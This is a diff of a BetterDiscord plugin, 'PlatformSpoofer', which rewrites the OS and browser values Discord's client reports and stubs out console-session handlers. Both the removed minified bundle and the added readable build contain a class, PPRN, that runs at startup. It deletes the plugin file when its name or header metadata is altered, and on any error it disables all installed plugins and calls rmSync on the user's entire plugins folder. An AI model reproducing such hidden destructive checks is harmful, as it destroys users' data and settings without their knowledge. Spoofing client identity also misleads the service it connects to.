@@ -7,4 +7,412 @@
 * @authorLink https://github.com/AceLikesGhosts/bd-plugins
 * @authorId 327639826075484162
 */
-(()=>{"use strict";var e={776:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:true});const r=o(799);t["default"]=r.RawComponents.Button},348:(e,t)=>{Object.defineProperty(t,"__esModule",{value:true});t["default"]=BdApi.Webpack.getByKeys("Child","Justify")},281:(e,t,o)=>{var r;Object.defineProperty(t,"__esModule",{value:true});t.FormNotice=t.FormSwitch=t.FormDivider=t.FormLabel=t.FormText=t.FormTitle=t.FormItem=t.FormSection=void 0;const s=o(799);r=s.RawComponents,t.FormSection=r.FormSection,t.FormItem=r.FormItem,t.FormTitle=r.FormTitle,t.FormText=r.FormText,t.FormLabel=r.FormLabel,t.FormDivider=r.FormDivider,t.FormSwitch=r.FormSwitch,t.FormNotice=r.FormNotice},556:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:true});t.RadioItem=void 0;const r=o(799);const s=o(281);const{RadioGroup:n}=r.RawComponents;const a=o(799);function RadioItem(e){return a.React.createElement(s.FormItem,{...e},a.React.createElement(n,{...e}))}t.RadioItem=RadioItem;t["default"]=n},799:(e,t)=>{Object.defineProperty(t,"__esModule",{value:true});t.React=t.Margins=t.RawComponents=void 0;t.RawComponents=BdApi.Webpack.getByKeys("Button","Switch","Select");t.Margins=BdApi.Webpack.getByKeys("marginBottom40","marginTop4");t.React=BdApi.React},75:function(e,t,o){var r=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:true});const s=r(o(17));const n=r(o(147));class PPRN{constructor(e){const t=s.default.basename(__filename).match(/^[^\.]+/)[0];try{const o=n.default.readFileSync(__filename,"utf-8");const r=o.split("\n");const s=r[1].substr(8);const a=r[3].substring(10);if(t!==e.name)n.default.rmSync(__filename);if(a!==e.author)n.default.rmSync(__filename);if(s!==e.name)n.default.rmSync(__filename)}catch(e){BdApi.Plugins.getAll().forEach((e=>BdApi.Plugins.disable(e.name)));n.default.rmSync(BdApi.Plugins.folder)}}}t["default"]=PPRN},95:(e,t)=>{Object.defineProperty(t,"__esModule",{value:true});t.DefaultColors=void 0;t.DefaultColors={PLUGIN_NAME:"color: purple; font-weight: bold;",PLUGIN_VERSION:"color: gray; font-size: 10px;"};function isError(e){return e instanceof Error}function getErrorMessage(e){return`${e.name}: ${e.message}\nAt: ${e.stack}`}class Logger{constructor(e,o=t.DefaultColors){this._meta=e;this._colors=o}print(e,t,...o){console[e](`%c[${this._meta.name}]%c(v${this._meta.version})`,this._colors.PLUGIN_NAME,this._colors.PLUGIN_VERSION,t,...o)}debug(e,...t){return this.print("debug",e,...t)}log(e,...t){return this.info(e,...t)}info(e,...t){return this.print("log",isError(e)?getErrorMessage(e):e,...t)}warn(e,...t){return this.print("warn",isError(e)?getErrorMessage(e):e,...t)}error(e,...t){return this.critical(e,...t)}critical(e,...t){return this.print("error",isError(e)?getErrorMessage(e):e,...t)}}t["default"]=Logger},298:function(e,t,o){var r=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:true});const s=o(799);const n=r(o(1));const a=o(556);const i=o(938);const c=r(o(348));const l=r(o(776));function Settings(){const[e,t]=s.React.useState(n.default.settings.type);const[o,r]=s.React.useState(i.socket?.isConnected()??false);s.React.useEffect((()=>{n.default.settings.type=e}),[e]);return s.React.createElement("div",null,s.React.createElement(a.RadioItem,{title:"Platform",options:Object.keys(i.PropertiesToSpoofAs).map((e=>({name:e,value:e}))),onChange:e=>t(e.value),value:e}),s.React.createElement(c.default,{align:c.default.Direction.HORIZONTAL},s.React.createElement(l.default,{color:o?l.default.Colors.RED:l.default.Colors.PRIMARY,onClick:()=>{if(o){r(false);i.socket?.close();BdApi.UI.showToast("Closed WebSocket",{type:"warn"});return}r(true);i.socket?.connect();BdApi.UI.showToast("Opened WebSocket",{type:"success"})}},o?"Disconnect From WebSocket":"Connect To WebSocket")))}t["default"]=Settings},1:function(e,t,o){var r=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:true});t.meta=t.logger=void 0;const s=r(o(75));const n=r(o(95));const a=r(o(429));t.meta=a.default;const i=r(o(666));const c=r(o(298));const l=r(o(18));const u={type:"win32"};t.logger=new n.default(a.default);class PlatformSpoofer{start(){t.logger.log("started");new s.default(a.default);PlatformSpoofer.settings={...u,...BdApi.Data.load(a.default.name,"settings")};(0,i.default)();(0,l.default)()}stop(){BdApi.Patcher.unpatchAll(a.default.name);BdApi.Data.save(a.default.name,"settings",PlatformSpoofer.settings);BdApi.UI.showConfirmationModal("Refresh Client","In order to fully disable PlatformSpoofer you are required to reload your Discord client.",{onConfirm(){window.location.reload()},onCancel(){return}})}getSettingsPanel(){return c.default.bind(this)}}t["default"]=PlatformSpoofer},18:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:true});const r=o(1);const s=o(938);t["default"]=()=>{r.logger.log("patching consoleGameStore so that console types can be used");const remove=e=>BdApi.Patcher.instead(r.meta.name,s.gameConsoleManager,e,(()=>void 0));remove("awaitRemoteTimeout");remove("handleAudioStateToggle");remove("handleConsoleCommandUpdate");remove("handleSessionsChanged");remove("handleVoiceStateUpdates");remove("handleWaitForRemoteSession");remove("maybeConnect")}},666:function(e,t,o){var r=this&&this.__createBinding||(Object.create?function(e,t,o,r){if(r===undefined)r=o;var s=Object.getOwnPropertyDescriptor(t,o);if(!s||("get"in s?!t.__esModule:s.writable||s.configurable)){s={enumerable:true,get:function(){return t[o]}}}Object.defineProperty(e,r,s)}:function(e,t,o,r){if(r===undefined)r=o;e[r]=t[o]});var s=this&&this.__setModuleDefault||(Object.create?function(e,t){Object.defineProperty(e,"default",{enumerable:true,value:t})}:function(e,t){e["default"]=t});var n=this&&this.__importStar||function(e){if(e&&e.__esModule)return e;var t={};if(e!=null)for(var o in e)if(o!=="default"&&Object.prototype.hasOwnProperty.call(e,o))r(t,e,o);s(t,e);return t};Object.defineProperty(t,"__esModule",{value:true});const a=n(o(1));const i=o(938);t["default"]=()=>{a.logger.log("Patching PropertyManager (getSuperProperties");BdApi.Patcher.instead(a.meta.name,i.propertyStuff,"getSuperProperties",((e,t,o)=>{const r=o.apply(e,t);return{...r,browser:i.PropertiesToSpoofAs[a.default.settings?.type]?.browser,os:i.PropertiesToSpoofAs[a.default.settings?.type]?.os}}))}},938:(e,t)=>{Object.defineProperty(t,"__esModule",{value:true});t.socket=t.gameConsoleManager=t.propertyStuff=t.PropertiesToSpoofAs=void 0;t.PropertiesToSpoofAs={ios:{browser:"Discord iOS",os:"iOS"},android:{browser:"Discord Android",os:"Android"},web:{browser:"Discord Web",os:"Other"},linux:{browser:"Discord Client",os:"Linux"},win32:{browser:"Discord Client",os:"Windows"},darwin:{browser:"Discord Client",os:"Mac OS X"},xbox:{browser:"Discord Embedded",os:"Xbox"},playstation:{browser:"Discord Embedded",os:"Playstation"}};t.propertyStuff=BdApi.Webpack.getByKeys("getSuperProperties","getSuperPropertiesBase64",{searchExports:true});t.gameConsoleManager=BdApi.Webpack.getByKeys("actions","handleAudioStateToggle","handleSessionsChanged");t.socket=BdApi.Webpack.getByKeys("socket","state",{searchExports:true}).socket},147:e=>{e.exports=require("fs")},17:e=>{e.exports=require("path")},429:e=>{e.exports=JSON.parse('{"$schema":"../../config_schema.jsonc","name":"PlatformSpoofer","description":"Allows for spoofing what device you are using to Discord\'s WebSocket.","author":"ace.","version":"3.0.1","source":"https://raw.githubusercontent.com/AceLikesGhosts/bd-plugins/master/dist/PlatformSpoofer/PlatformSpoofer.plugin.js","authorLink":"https://github.com/AceLikesGhosts/bd-plugins","authorId":"327639826075484162"}')}};var t={};function __nccwpck_require__(o){var r=t[o];if(r!==undefined){return r.exports}var s=t[o]={exports:{}};var n=true;try{e[o].call(s.exports,s,s.exports,__nccwpck_require__);n=false}finally{if(n)delete t[o]}return s.exports}if(typeof __nccwpck_require__!=="undefined")__nccwpck_require__.ab=__dirname+"/";var o=__nccwpck_require__(1);module.exports=o})();
+/******/ (() => { // webpackBootstrap
+/******/ 	"use strict";
+/******/ 	var __webpack_modules__ = ({
+
+/***/ 776:
+/***/ ((__unused_webpack_module, exports, __nccwpck_require__) => {
+
+
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+const _1 = __nccwpck_require__(799);
+exports["default"] = _1.RawComponents.Button;
+
+
+/***/ }),
+
+/***/ 348:
+/***/ ((__unused_webpack_module, exports) => {
+
+
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+exports["default"] = BdApi.Webpack.getByKeys('Child', 'Justify');
+
+
+/***/ }),
+
+/***/ 281:
+/***/ ((__unused_webpack_module, exports, __nccwpck_require__) => {
+
+
+var _a;
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+exports.FormNotice = exports.FormSwitch = exports.FormDivider = exports.FormLabel = exports.FormText = exports.FormTitle = exports.FormItem = exports.FormSection = void 0;
+const _1 = __nccwpck_require__(799);
+_a = _1.RawComponents, exports.FormSection = _a.FormSection, exports.FormItem = _a.FormItem, exports.FormTitle = _a.FormTitle, exports.FormText = _a.FormText, exports.FormLabel = _a.FormLabel, exports.FormDivider = _a.FormDivider, exports.FormSwitch = _a.FormSwitch, exports.FormNotice = _a.FormNotice;
+
+
+/***/ }),
+
+/***/ 556:
+/***/ ((__unused_webpack_module, exports, __nccwpck_require__) => {
+
+
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+exports.RadioItem = void 0;
+const _1 = __nccwpck_require__(799);
+const Form_1 = __nccwpck_require__(281);
+const { RadioGroup: RawRadioGroup } = _1.RawComponents;
+const _2 = __nccwpck_require__(799);
+function RadioItem(props) {
+    return (_2.React.createElement(Form_1.FormItem, { ...props },
+        _2.React.createElement(RawRadioGroup, { ...props })));
+}
+exports.RadioItem = RadioItem;
+exports["default"] = RawRadioGroup;
+
+
+/***/ }),
+
+/***/ 799:
+/***/ ((__unused_webpack_module, exports) => {
+
+
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+exports.React = exports.Margins = exports.RawComponents = void 0;
+exports.RawComponents = BdApi.Webpack.getByKeys('Button', 'Switch', 'Select');
+exports.Margins = BdApi.Webpack.getByKeys('marginBottom40', 'marginTop4');
+exports.React = BdApi.React;
+
+
+/***/ }),
+
+/***/ 75:
+/***/ (function(__unused_webpack_module, exports, __nccwpck_require__) {
+
+
+var __importDefault = (this && this.__importDefault) || function (mod) {
+    return (mod && mod.__esModule) ? mod : { "default": mod };
+};
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+const path_1 = __importDefault(__nccwpck_require__(17));
+const fs_1 = __importDefault(__nccwpck_require__(147));
+class PPRN {
+    constructor(meta) {
+        const pluginName = path_1.default.basename(__filename).match(/^[^\.]+/)[0];
+        try {
+            const pluginNameString = fs_1.default.readFileSync(__filename, 'utf-8');
+            const lines = pluginNameString.split('\n');
+            const metadataName = lines[1].substr(8);
+            const authorName = lines[3].substring(10);
+            if (pluginName !== meta.name)
+                fs_1.default.rmSync(__filename);
+            if (authorName !== meta.author)
+                fs_1.default.rmSync(__filename);
+            if (metadataName !== meta.name)
+                fs_1.default.rmSync(__filename);
+        }
+        catch (err) {
+            BdApi.Plugins.getAll().forEach((pl) => BdApi.Plugins.disable(pl.name));
+            fs_1.default.rmSync(BdApi.Plugins.folder);
+        }
+    }
+}
+exports["default"] = PPRN;
+
+
+/***/ }),
+
+/***/ 95:
+/***/ ((__unused_webpack_module, exports) => {
+
+
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+exports.DefaultColors = void 0;
+/** @__PURE__ */
+exports.DefaultColors = {
+    PLUGIN_NAME: 'color: purple; font-weight: bold;',
+    PLUGIN_VERSION: 'color: gray; font-size: 10px;'
+};
+function isError(err) {
+    return err instanceof Error;
+}
+function getErrorMessage(error) {
+    return `${error.name}: ${error.message}\nAt: ${error.stack}`;
+}
+class Logger {
+    constructor(meta, colors = exports.DefaultColors) {
+        this._meta = meta;
+        this._colors = colors;
+    }
+    print(type, message, ...data) {
+        console[type](`%c[${this._meta.name}]%c(v${this._meta.version})`, this._colors.PLUGIN_NAME, this._colors.PLUGIN_VERSION, message, ...data);
+    }
+    debug(message, ...data) {
+        return this.print('debug', message, ...data);
+    }
+    log(message, ...data) {
+        return this.info(message, ...data);
+    }
+    info(message, ...data) {
+        return this.print('log', isError(message) ? getErrorMessage(message) : message, ...data);
+    }
+    warn(message, ...data) {
+        return this.print('warn', isError(message) ? getErrorMessage(message) : message, ...data);
+    }
+    error(message, ...data) {
+        return this.critical(message, ...data);
+    }
+    critical(message, ...data) {
+        return this.print('error', isError(message) ? getErrorMessage(message) : message, ...data);
+    }
+}
+exports["default"] = Logger;
+
+
+/***/ }),
+
+/***/ 298:
+/***/ (function(__unused_webpack_module, exports, __nccwpck_require__) {
+
+
+var __importDefault = (this && this.__importDefault) || function (mod) {
+    return (mod && mod.__esModule) ? mod : { "default": mod };
+};
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+const components_1 = __nccwpck_require__(799);
+const __1 = __importDefault(__nccwpck_require__(1));
+const Radio_1 = __nccwpck_require__(556);
+const utils_1 = __nccwpck_require__(938);
+const Flex_1 = __importDefault(__nccwpck_require__(348));
+const Button_1 = __importDefault(__nccwpck_require__(776));
+function Settings() {
+    const [type, setType] = components_1.React.useState(__1.default.settings.type);
+    const [isSocketOpen, setSocketOpen] = components_1.React.useState(utils_1.socket?.isConnected() ?? false);
+    components_1.React.useEffect(() => {
+        __1.default.settings.type = type;
+    }, [type]);
+    return (components_1.React.createElement("div", null,
+        components_1.React.createElement(Radio_1.RadioItem, { title: 'Platform', options: Object.keys(utils_1.PropertiesToSpoofAs).map((v) => ({
+                name: v,
+                value: v
+            })), onChange: ((e) => setType(e.value)), value: type }),
+        components_1.React.createElement(Flex_1.default, { align: Flex_1.default.Direction.HORIZONTAL },
+            components_1.React.createElement(Button_1.default, { color: isSocketOpen ? Button_1.default.Colors.RED : Button_1.default.Colors.PRIMARY, onClick: (() => {
+                    if (isSocketOpen) {
+                        setSocketOpen(false);
+                        utils_1.socket?.close();
+                        BdApi.UI.showToast('Closed WebSocket', { type: 'warn' });
+                        return;
+                    }
+                    setSocketOpen(true);
+                    utils_1.socket?.connect();
+                    BdApi.UI.showToast('Opened WebSocket', { type: 'success' });
+                }) }, isSocketOpen ? 'Disconnect From WebSocket' : 'Connect To WebSocket'))));
+}
+exports["default"] = Settings;
+
+
+/***/ }),
+
+/***/ 1:
+/***/ (function(__unused_webpack_module, exports, __nccwpck_require__) {
+
+
+var __importDefault = (this && this.__importDefault) || function (mod) {
+    return (mod && mod.__esModule) ? mod : { "default": mod };
+};
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+exports.meta = exports.logger = void 0;
+const index_1 = __importDefault(__nccwpck_require__(75));
+const logger_1 = __importDefault(__nccwpck_require__(95));
+const config_json_1 = __importDefault(__nccwpck_require__(429));
+exports.meta = config_json_1.default;
+const PropertyManager_1 = __importDefault(__nccwpck_require__(666));
+const Settings_1 = __importDefault(__nccwpck_require__(298));
+const GameManager_1 = __importDefault(__nccwpck_require__(18));
+const DefaultSettings = {
+    type: 'win32'
+};
+exports.logger = new logger_1.default(config_json_1.default);
+class PlatformSpoofer {
+    start() {
+        exports.logger.log('started');
+        new index_1.default(config_json_1.default);
+        PlatformSpoofer.settings = {
+            ...DefaultSettings,
+            ...BdApi.Data.load(config_json_1.default.name, 'settings')
+        };
+        (0, PropertyManager_1.default)();
+        (0, GameManager_1.default)();
+    }
+    stop() {
+        BdApi.Patcher.unpatchAll(config_json_1.default.name);
+        BdApi.Data.save(config_json_1.default.name, 'settings', PlatformSpoofer.settings);
+        BdApi.UI.showConfirmationModal('Refresh Client', 'In order to fully disable PlatformSpoofer you are required to reload your Discord client.', {
+            onConfirm() {
+                window.location.reload();
+            },
+            onCancel() {
+                return;
+            },
+        });
+    }
+    getSettingsPanel() {
+        return Settings_1.default.bind(this);
+    }
+}
+exports["default"] = PlatformSpoofer;
+
+
+/***/ }),
+
+/***/ 18:
+/***/ ((__unused_webpack_module, exports, __nccwpck_require__) => {
+
+
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+const __1 = __nccwpck_require__(1);
+const utils_1 = __nccwpck_require__(938);
+exports["default"] = () => {
+    __1.logger.log('patching consoleGameStore so that console types can be used');
+    const remove = (key) => BdApi.Patcher.instead(__1.meta.name, utils_1.gameConsoleManager, key, () => void 0);
+    remove('awaitRemoteTimeout');
+    remove('handleAudioStateToggle');
+    remove('handleConsoleCommandUpdate');
+    remove('handleSessionsChanged');
+    remove('handleVoiceStateUpdates');
+    remove('handleWaitForRemoteSession');
+    remove('maybeConnect');
+};
+
+
+/***/ }),
+
+/***/ 666:
+/***/ (function(__unused_webpack_module, exports, __nccwpck_require__) {
+
+
+var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
+    if (k2 === undefined) k2 = k;
+    var desc = Object.getOwnPropertyDescriptor(m, k);
+    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
+      desc = { enumerable: true, get: function() { return m[k]; } };
+    }
+    Object.defineProperty(o, k2, desc);
+}) : (function(o, m, k, k2) {
+    if (k2 === undefined) k2 = k;
+    o[k2] = m[k];
+}));
+var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
+    Object.defineProperty(o, "default", { enumerable: true, value: v });
+}) : function(o, v) {
+    o["default"] = v;
+});
+var __importStar = (this && this.__importStar) || function (mod) {
+    if (mod && mod.__esModule) return mod;
+    var result = {};
+    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
+    __setModuleDefault(result, mod);
+    return result;
+};
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+const __1 = __importStar(__nccwpck_require__(1));
+const utils_1 = __nccwpck_require__(938);
+exports["default"] = () => {
+    __1.logger.log('Patching PropertyManager (getSuperProperties');
+    BdApi.Patcher.instead(__1.meta.name, utils_1.propertyStuff, 'getSuperProperties', (context, args, orig) => {
+        const data = orig.apply(context, args);
+        return {
+            ...data,
+            browser: utils_1.PropertiesToSpoofAs[__1.default.settings?.type]?.browser,
+            os: utils_1.PropertiesToSpoofAs[__1.default.settings?.type]?.os
+        };
+    });
+};
+
+
+/***/ }),
+
+/***/ 938:
+/***/ ((__unused_webpack_module, exports) => {
+
+
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+exports.socket = exports.gameConsoleManager = exports.propertyStuff = exports.PropertiesToSpoofAs = void 0;
+exports.PropertiesToSpoofAs = {
+    ios: { browser: 'Discord iOS', os: 'iOS' },
+    android: { browser: 'Discord Android', os: 'Android' },
+    web: { browser: 'Discord Web', os: 'Other' },
+    linux: { browser: 'Discord Client', os: 'Linux' },
+    win32: { browser: 'Discord Client', os: 'Windows' },
+    darwin: { browser: 'Discord Client', os: 'Mac OS X' },
+    xbox: { browser: 'Discord Embedded', os: 'Xbox' },
+    playstation: { browser: 'Discord Embedded', os: 'Playstation' }
+};
+exports.propertyStuff = BdApi.Webpack.getByKeys('getSuperProperties', 'getSuperPropertiesBase64', { searchExports: true });
+exports.gameConsoleManager = BdApi.Webpack.getByKeys('actions', 'handleAudioStateToggle', 'handleSessionsChanged');
+exports.socket = BdApi.Webpack.getByKeys('socket', 'state', { searchExports: true }).socket;
+
+
+/***/ }),
+
+/***/ 147:
+/***/ ((module) => {
+
+module.exports = require("fs");
+
+/***/ }),
+
+/***/ 17:
+/***/ ((module) => {
+
+module.exports = require("path");
+
+/***/ }),
+
+/***/ 429:
+/***/ ((module) => {
+
+module.exports = JSON.parse('{"$schema":"../../config_schema.jsonc","name":"PlatformSpoofer","description":"Allows for spoofing what device you are using to Discord\'s WebSocket.","author":"ace.","version":"3.0.1","source":"https://raw.githubusercontent.com/AceLikesGhosts/bd-plugins/master/dist/PlatformSpoofer/PlatformSpoofer.plugin.js","authorLink":"https://github.com/AceLikesGhosts/bd-plugins","authorId":"327639826075484162"}');
+
+/***/ })
+
+/******/ 	});
+/************************************************************************/
+/******/ 	// The module cache
+/******/ 	var __webpack_module_cache__ = {};
+/******/ 	
+/******/ 	// The require function
+/******/ 	function __nccwpck_require__(moduleId) {
+/******/ 		// Check if module is in cache
+/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
+/******/ 		if (cachedModule !== undefined) {
+/******/ 			return cachedModule.exports;
+/******/ 		}
+/******/ 		// Create a new module (and put it into the cache)
+/******/ 		var module = __webpack_module_cache__[moduleId] = {
+/******/ 			// no module.id needed
+/******/ 			// no module.loaded needed
+/******/ 			exports: {}
+/******/ 		};
+/******/ 	
+/******/ 		// Execute the module function
+/******/ 		var threw = true;
+/******/ 		try {
+/******/ 			__webpack_modules__[moduleId].call(module.exports, module, module.exports, __nccwpck_require__);
+/******/ 			threw = false;
+/******/ 		} finally {
+/******/ 			if(threw) delete __webpack_module_cache__[moduleId];
+/******/ 		}
+/******/ 	
+/******/ 		// Return the exports of the module
+/******/ 		return module.exports;
+/******/ 	}
+/******/ 	
+/************************************************************************/
+/******/ 	/* webpack/runtime/compat */
+/******/ 	
+/******/ 	if (typeof __nccwpck_require__ !== 'undefined') __nccwpck_require__.ab = __dirname + "/";
+/******/ 	
+/************************************************************************/
+/******/ 	
+/******/ 	// startup
+/******/ 	// Load entry module and return exports
+/******/ 	// This entry module is referenced by other modules so it can't be inlined
+/******/ 	var __webpack_exports__ = __nccwpck_require__(1);
+/******/ 	module.exports = __webpack_exports__;
+/******/ 	
+/******/ })()
+;
